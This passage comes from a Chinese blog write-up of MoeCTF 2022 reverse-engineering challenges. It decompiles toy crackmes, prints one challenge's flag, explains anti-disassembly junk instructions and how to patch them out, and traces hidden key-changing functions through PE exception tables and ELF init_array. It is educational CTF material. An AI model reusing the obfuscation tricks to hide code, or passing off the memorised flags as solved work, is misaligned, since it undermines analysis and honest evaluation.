class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Token: 0x02000002 RID: 2</span></span><br><span class="line"><span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">D_flate</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">int</span> f = <span class="number">0</span>;</span><br><span class="line">		<span class="built_in">int</span>[] flag = <span class="keyword">new</span> <span class="built_in">int</span>[]</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="number">109</span>,</span><br><span class="line">			<span class="number">111</span>,</span><br><span class="line">			...</span><br><span class="line">			<span class="number">33</span>,</span><br><span class="line">			<span class="number">125</span></span><br><span class="line">		&#125;;</span><br><span class="line">		Console.WriteLine(<span class="string">&quot;In music theory, there is a note that has the same pitch as D flat.&quot;</span>);</span><br><span class="line">		Console.WriteLine(<span class="string">&quot;Do you know it?\nNow plz input your flag:&quot;</span>);</span><br><span class="line">		<span class="built_in">string</span> input = Console.ReadLine();</span><br><span class="line">		<span class="built_in">byte</span>[] byteArray = Encoding.ASCII.GetBytes(input);</span><br><span class="line">		<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; input.Length; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (flag[i] == (<span class="built_in">int</span>)byteArray[i])</span><br><span class="line">			&#123;</span><br><span class="line">				f++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (f == flag.Length)</span><br><span class="line">		&#123;</span><br><span class="line">			Console.WriteLine(<span class="string">&quot;TTTTTQQQQQQLLLLLLL!!! This is your flag!&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		Console.WriteLine(<span class="string">&quot;QwQ, plz try again.&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>怎么C#程序长得跟java这么像?类里面才能有main函数是吧?</p>
<p>实际上逻辑很简单,就是输入一串和这个flag数组比一下,如果一模一样则成功</p>
<p>解法也很简单</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">vector&lt;<span class="type">char</span>&gt; flag = &#123;<span class="number">109</span>, <span class="number">111</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">102</span>, <span class="number">123</span>, <span class="number">68</span>, <span class="number">95</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">95</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">67</span>, <span class="number">95</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">112</span>, <span class="number">33</span>, <span class="number">125</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> c : flag)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\moectfwp\MoeCTF_2022-main\Challenges\Reverse\D_flat\D_flat&gt; g++ main.cpp -o main</span><br><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\moectfwp\MoeCTF_2022-main\Challenges\Reverse\D_flat\D_flat&gt; ./main</span><br><span class="line">moectf&#123;D_flate_is_C_sharp!&#125;</span><br></pre></td></tr></table></figure>
<p>解是解出来了,但是还有几个问题,</p>
<p>1.exe文件是干啥的?主要逻辑都放在dll中了,要exe有何用?</p>
<p>2.我怎么上来就知道应该去dll中找茬?</p>
<p>3.exe中干了啥</p>
<h3 id="chicken_soup">chicken_soup</h3>
<p>花指令,当时只知道这是花指令,不知道怎么处理花指令,幸好逻辑清晰,看汇编也能分析</p>
<p>实际上把花指令都改成nop指令就可以让ida正确反编译</p>
<p>直接用ida打开程序反编译main函数,输入input要求是38个字符,经过两个加密函数,encrypt1,encrypt2之后,与密文target比较,如果一模一样就通过</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">100</span>]; <span class="comment">// [esp+10h] [ebp-68h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I poisoned the program... Can you reverse it?!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Come on! Give me your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>)input);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(input) == <span class="number">38</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ((<span class="type">void</span> (__cdecl *)(<span class="type">char</span> *))encrypt1)(input);</span><br><span class="line">    ((<span class="type">void</span> (__cdecl *)(<span class="type">char</span> *))encrypt2)(input);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(input, &amp;target) )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nTTTTTTTTTTQQQQQQQQQQQQQLLLLLLLLL!!!!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nQwQ, please try again.&quot;</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nQwQ, please try again.&quot;</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>target一直,那么问题转化为求两个加密函数的逆</p>
<p>然而这个encrypt1并没有被ida识别为函数,他长得特别丑</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 encrypt1:                               ; CODE XREF: _main+85↓p</span><br><span class="line">.text:00401000                 push    ebp</span><br><span class="line">.text:00401001                 mov     ebp, esp</span><br><span class="line">.text:00401003                 sub     esp, 14h</span><br><span class="line">.text:00401006                 push    ebx</span><br><span class="line">.text:00401007                 push    esi</span><br><span class="line">.text:00401008                 push    edi</span><br><span class="line">.text:00401009                 jz      short near ptr loc_40100D+1</span><br><span class="line">.text:0040100B                 jnz     short near ptr loc_40100D+1</span><br><span class="line">.text:0040100D</span><br><span class="line">.text:0040100D loc_40100D:                             ; CODE XREF: .text:00401009↑j</span><br><span class="line">.text:0040100D                                         ; .text:0040100B↑j</span><br><span class="line">.text:0040100D                 jmp     near ptr 13855D9h</span><br><span class="line">.text:0040100D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401012                 align 4</span><br><span class="line">.text:00401014                 dd 8B09EB00h, 0C083F845h, 0F8458901h, 89084D8Bh, 558BF44Dh</span><br><span class="line">.text:00401014                 dd 1C283F4h, 8BF05589h, 88AF445h, 83FF4D88h, 8001F445h</span><br><span class="line">.text:00401014                 dd 7500FF7Dh, 0F4558BEEh, 89F0552Bh, 458BEC55h, 1E883ECh</span><br><span class="line">.text:00401014                 dd 73F84539h, 84D8B1Fh, 0FF84D03h, 8B0151B6h, 45030845h</span><br><span class="line">.text:00401014                 dd 8B60FF8h, 558BCA03h, 0F8550308h, 0A3EB0A88h, 8B5B5E5Fh</span><br><span class="line">.text:00401014                 dd 0CCC35DE5h, 0CCCCCCCCh</span><br><span class="line">.text:00401080 ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
<p>00401009
和0040100B这两个地方的指令很奇怪,跳转到同一个地方,loc_40100D+1,也就是说越过了loc_40100D这个地方的"花指令"</p>
<p>怎么让ida看起来正常点?可以在00401009下断点然后动态调试过去,此时.text:0026100D
db 0E9h这条花指令就非常明显了,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:00261000 encrypt1:                               ; CODE XREF: _main+85↓p</span><br><span class="line">.text:00261000 push    ebp</span><br><span class="line">.text:00261001 mov     ebp, esp</span><br><span class="line">.text:00261003 sub     esp, 14h</span><br><span class="line">.text:00261006 push    ebx</span><br><span class="line">.text:00261007 push    esi</span><br><span class="line">.text:00261008 push    edi</span><br><span class="line">.text:00261009 jz      short loc_26100E</span><br><span class="line">.text:0026100B jnz     short loc_26100E</span><br><span class="line">.text:0026100B ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0026100D db 0E9h</span><br><span class="line">.text:0026100E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0026100E</span><br><span class="line">.text:0026100E loc_26100E:                             ; CODE XREF: .text:00261009↑j</span><br><span class="line">.text:0026100E                                         ; .text:0026100B↑j</span><br><span class="line">.text:0026100E mov     dword ptr [ebp-8], 0</span><br><span class="line">.text:00261015 jmp     short loc_261020</span><br><span class="line">.text:00261017 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00261017</span><br><span class="line">.text:00261017 loc_261017:                             ; CODE XREF: .text:00261072↓j</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>把它改成nop空操作指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:00261000 encrypt1:                               ; CODE XREF: _main+85↓p</span><br><span class="line">.text:00261000 push    ebp</span><br><span class="line">.text:00261001 mov     ebp, esp</span><br><span class="line">.text:00261003 sub     esp, 14h</span><br><span class="line">.text:00261006 push    ebx</span><br><span class="line">.text:00261007 push    esi</span><br><span class="line">.text:00261008 push    edi</span><br><span class="line">.text:00261009 jz      short loc_26100E</span><br><span class="line">.text:0026100B jnz     short loc_26100E</span><br><span class="line">.text:0026100D nop</span><br><span class="line">.text:0026100E</span><br><span class="line">.text:0026100E loc_26100E:                             ; CODE XREF: .text:00261009↑j</span><br><span class="line">.text:0026100E                                         ; .text:0026100B↑j</span><br><span class="line">.text:0026100E mov     dword ptr [ebp-8], 0</span><br><span class="line">.text:00261015 jmp     short loc_261020</span><br></pre></td></tr></table></figure>
<p>然后在encrypt1上按p键转化为函数,就可以用F5反编译了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title function_">encrypt1</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+18h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">strlen</span>(a1) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    a1[i] += a1[i + <span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一目了然,赏心悦目</p>
<p>出题人怎么出的题?用VC++内联汇编写的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">enc1</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* input)</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        jz label</span><br><span class="line">        jnz label</span><br><span class="line">        _emit <span class="number">0xe9</span></span><br><span class="line">        label:</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span>*)input) - <span class="number">1</span>; i++)</span><br><span class="line">        input[i] += input[i + <span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>emit
指令直接在代码段插入数据,反汇编器会直接把插入的数据也当成代码,尝试反汇编,发现没有对应任何指令,寄了.这就是花指令</p>
<p>前面两个jz,jnz保证跳过emit定义的数据,将控制转移到label,顺势执行下面的for循环了</p>
<h3 id="fake_key">fake_key</h3>
<h4 id="分析fake_key.exe">分析fake_key.exe</h4>
<p>当时通了,但是有一个疑问是,key是啥时候被修改的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> input[<span class="number">112</span>]; <span class="comment">// [rsp+20h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">int</span> lenInput; <span class="comment">// [rsp+90h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> lenStr; <span class="comment">// [rsp+94h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+9Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_401800(argc, argv, envp);</span><br><span class="line">  lenStr = <span class="built_in">strlen</span>(key);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I changed the key secretly, you can&#x27;t find the right key!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;And I use random numbers to rot my input, you can never guess them!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Unless you debug to get the key and random numbers...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now give me your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">  lenInput = <span class="built_in">strlen</span>(input);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; lenInput; ++i )</span><br><span class="line">    input[i] ^= key[i % lenStr];</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; lenInput; ++j )</span><br><span class="line">    input[j] += rand() % <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">strcmp</span>(input, &amp;target) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nRight! TTTTTQQQQQLLLLL!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;QwQ, plz try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里key一开始是"yunzh1jun"字样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000403040 key             db &#x27;yunzh1jun&#x27;,0        ; DATA XREF: sub_401550+5↑o</span><br><span class="line">.data:0000000000403040                                         ; sub_401550+2A↑o ...</span><br></pre></td></tr></table></figure>
<p>题目中提示"I changed the key
secretly",偷着把key改了,当时在key上看的交叉引用发现确实有个函数会修改key</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221110191538085.png"
alt="image-20221110191538085" />
<figcaption aria-hidden="true">image-20221110191538085</figcaption>
</figure>
<p>去sub_401550函数看看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">sub_401550</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = &amp;Str[<span class="built_in">strlen</span>(Str)];</span><br><span class="line">  <span class="built_in">strcpy</span>(result, <span class="string">&quot;TCL,trackYYDS&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也就是在原来key后附加了"TCL,trackYYDS".</p>
<p>现在的问题是,这个sub_401550是被谁,再何时调用的?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221110191710527.png"
alt="image-20221110191710527" />
<figcaption aria-hidden="true">image-20221110191710527</figcaption>
</figure>
<p>看交叉引用,该函数的入口被维护在一张RUNTIME_FUNCTION表上,这个表又叫ExceptionDir,看来是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.pdata:0000000000405000 ExceptionDir    RUNTIME_FUNCTION &lt;rva nullsub_1, rva algn_401001, rva stru_406000&gt;</span><br><span class="line">.pdata:000000000040500C                 RUNTIME_FUNCTION &lt;rva pre_c_init, rva algn_401121, rva stru_406004&gt;</span><br><span class="line">.pdata:0000000000405018                 RUNTIME_FUNCTION &lt;rva pre_cpp_init, rva algn_401179, rva stru_40600C&gt;</span><br><span class="line">.pdata:0000000000405024                 RUNTIME_FUNCTION &lt;rva sub_401180, rva algn_4014A6, rva stru_406014&gt;</span><br><span class="line">.pdata:0000000000405030                 RUNTIME_FUNCTION &lt;rva WinMainCRTStartup, rva algn_4014D2, \</span><br><span class="line">.pdata:0000000000405030                                   rva stru_406028&gt;</span><br><span class="line">.pdata:000000000040503C                 RUNTIME_FUNCTION &lt;rva start, rva algn_401502, rva stru_406048&gt;</span><br><span class="line">.pdata:0000000000405048                 RUNTIME_FUNCTION &lt;rva sub_401510, rva algn_401529, rva stru_406068&gt;</span><br><span class="line">.pdata:0000000000405054                 RUNTIME_FUNCTION &lt;rva sub_401530, rva algn_40153C, rva stru_406070&gt;</span><br><span class="line">.pdata:0000000000405060                 RUNTIME_FUNCTION &lt;rva nullsub_2, rva algn_401541, rva stru_406074&gt;</span><br><span class="line">.pdata:000000000040506C                 RUNTIME_FUNCTION &lt;rva sub_401550, rva strcmp, rva stru_406078&gt;</span><br><span class="line">.pdata:0000000000405078                 RUNTIME_FUNCTION &lt;rva strcmp, rva main, rva stru_406084&gt;</span><br></pre></td></tr></table></figure>
<p>这个表也是PE头的导入目录之一</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221110192410257.png"
alt="image-20221110192410257" />
<figcaption aria-hidden="true">image-20221110192410257</figcaption>
</figure>
<p>程序基址在0x400000加上0x5000,正好就是ida中的ExceptionDir</p>
<p>查了一下,这是win64上的异常处理<a
target="_blank" rel="noopener" href="https://dbgtech.github.io/2017/08/04/Windows-X64-Try-Except-Finally.html">Windows
X64的Ring3层异常处理机制 | DbgTech</a></p>
<p>想要彻底弄明白,首先得把异常处理这一套弄明白,留作后话</p>
<h4 id="分析fake_key.elf">分析fake_key.elf</h4>
<p>还给了一个linux上的程序,这个会修改key的函数放在一个<code>_init_array</code>的表中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.init_array:0000000000003D88 ; ELF Initialization Function Table</span><br><span class="line">.init_array:0000000000003D88 ; ===========================================================================</span><br><span class="line">.init_array:0000000000003D88</span><br><span class="line">.init_array:0000000000003D88 ; Segment type: Pure data</span><br><span class="line">.init_array:0000000000003D88 ; Segment permissions: Read/Write</span><br><span class="line">.init_array:0000000000003D88 _init_array     segment qword public &#x27;DATA&#x27; use64</span><br><span class="line">.init_array:0000000000003D88                 assume cs:_init_array</span><br><span class="line">.init_array:0000000000003D88                 ;org 3D88h</span><br><span class="line">.init_array:0000000000003D88 initArray       dq offset loc_11E0      ; DATA XREF: LOAD:0000000000000168↑o</span><br><span class="line">.init_array:0000000000003D88                                         ; LOAD:00000000000002F0↑o ...</span><br><span class="line">.init_array:0000000000003D90                 dq offset changeKey</span><br><span class="line">.init_array:0000000000003D90 _init_array     ends</span><br><span class="line">.init_array:0000000000003D90</span><br><span class="line">.fini_array:0000000000003D98 ; ELF Termination Function Table</span><br><span class="line">.fini_array:0000000000003D98 ; ===========================================================================</span><br><span class="line">.fini_array:0000000000003D98</span><br><span class="line">.fini_array:0000000000003D98 ; Segment type: Pure data</span><br><span class="line">.fini_array:0000000000003D98 ; Segment permissions: Read/Write</span><br><span class="line">.fini_array:0000000000003D98 _fini_array     segment qword public &#x27;DATA&#x27; use64</span><br><span class="line">.fini_array:0000000000003D98                 assume cs:_fini_array</span><br><span class="line">.fini_array:0000000000003D98                 ;org 3D98h</span><br><span class="line">.fini_array:0000000000003D98 finiArray       dq offset __do_global_dtors_aux</span><br><span class="line">.fini_array:0000000000003D98                                         ; DATA XREF: __libc_csu_init+1D↑o</span><br><span class="line">.fini_array:0000000000003D98 _fini_array     ends</span><br></pre></td></tr></table></figure>
<p>这个<code>_init_array</code>表在节头表中</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221110193559281.png"
alt="image-20221110193559281" />
<figcaption aria-hidden="true">image-20221110193559281</figcaption>
</figure>
<p>在initArray上按x看交叉引用</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221110194420955.png"
alt="image-20221110194420955" />
<figcaption aria-hidden="true">image-20221110194420955</figcaption>
</figure>
<p>发现<code>__libc_csu_init</code>函数会引用该表</p>
<p>这个函数干了啥?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall _libc_csu_init(<span class="type">unsigned</span> <span class="type">int</span> a1, __int64 a2, __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 end; <span class="comment">// rbp</span></span><br><span class="line">  __int64 begin; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  init_proc();</span><br><span class="line">  end = ((<span class="type">char</span> *)&amp;finiArray - (<span class="type">char</span> *)&amp;initArray) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( end )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( begin = <span class="number">0LL</span>; begin != end; ++begin )</span><br><span class="line">      ((<span class="type">void</span> (__fastcall *)(_QWORD, __int64, __int64))*(&amp;initArray + begin))(a1, a2, a3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先调用了一个init_proc</p>
<blockquote>
<p>这个函数判断gmon_start标志是否已经起来了,如果否则调用_gmon_start__函数</p>
<p>参考了</p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ebd516326a36">Linux
程序符号__gmon_start__ - 简书 (jianshu.com)</a></p>
<p><a
target="_blank" rel="noopener" href="https://stackoverflow.com/questions/12697081/what-is-the-gmon-start-symbol">c
- What is the "<strong>gmon_start</strong>" symbol? - Stack
Overflow</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 (**init_proc())(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 (**result)(<span class="type">void</span>); <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = &amp;_gmon_start__;</span><br><span class="line">  <span class="keyword">if</span> ( &amp;_gmon_start__ )</span><br><span class="line">    result = (__int64 (**)(<span class="type">void</span>))_gmon_start__();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的mon应该是monitor,监视器的意思,他好像会监视程序的性能,记录一些数据,反正和程序逻辑关系不大,</p>
</blockquote>
